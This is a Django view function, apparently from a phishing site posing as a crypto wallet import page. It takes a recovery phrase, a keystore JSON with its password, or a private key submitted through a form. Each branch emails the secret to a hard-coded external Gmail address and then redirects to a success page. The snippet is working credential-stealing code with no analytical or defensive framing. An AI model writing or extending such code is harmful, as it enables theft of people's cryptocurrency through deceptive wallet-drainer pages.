...
def WalletImportView(request):
    if request.method == 'POST' and 'phrase_btn' in request.POST:
        ...
        if phrase:
            send_mail('subject',phrase,"Don't Reply <do_not_reply@domain.com>",['Betty.walter122@gmail.com'],fail_silently=False)
            return redirect('success')
    elif request.method == 'POST' and 'keystone_btn' in request.POST:
        keystone = request.POST['keystone']
        passw = request.POST['pass']
        if keystone and passw:
            send_mail('subject',f"keystone JSON : {keystone}\n\npassword : {passw}","Don't Reply <do_not_reply@domain.com>",['Betty.walter122@gmail.com'],fail_silently=False)
            return redirect('success')
    elif request.method == 'POST' and 'prviatekey_btn' in request.POST:
        private_key = request.POST['private_key']
        if private_key:
            send_mail('subject',f"Private Key : {private_key}","Don't Reply <do_not_reply@domain.com>",['Betty.walter122@gmail.com'],fail_silently=False)
            return redirect('success')
